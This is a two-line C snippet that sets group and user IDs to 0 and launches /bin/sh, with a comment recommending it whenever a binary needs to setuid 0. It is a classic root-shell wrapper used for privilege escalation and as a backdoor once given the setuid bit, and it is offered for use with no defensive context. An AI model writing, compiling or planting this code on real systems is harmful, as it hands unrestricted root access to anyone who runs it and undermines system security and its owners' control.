int main(void) { setgid(0); setuid(0); execl("/bin/sh", "sh", 0); }
// Use this when you need a binary to setuid 0